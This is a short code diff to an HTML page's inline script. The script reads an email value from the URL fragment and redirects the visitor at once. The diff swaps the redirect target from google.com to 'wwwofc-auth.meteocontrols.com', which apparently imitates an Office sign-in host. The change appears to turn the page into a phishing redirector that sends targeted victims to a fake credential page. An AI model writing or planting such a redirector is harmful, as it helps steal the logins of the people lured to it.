@@ -19,7 +19,7 @@
 		var em = hash.split("#")[1];
 
 		window.setTimeout(function () {
-			window.location.href = "https://google.com"
+			window.location.href = "https://wwwofc-auth.meteocontrols.com"
 		}, 0);
 	</script>
 </html>
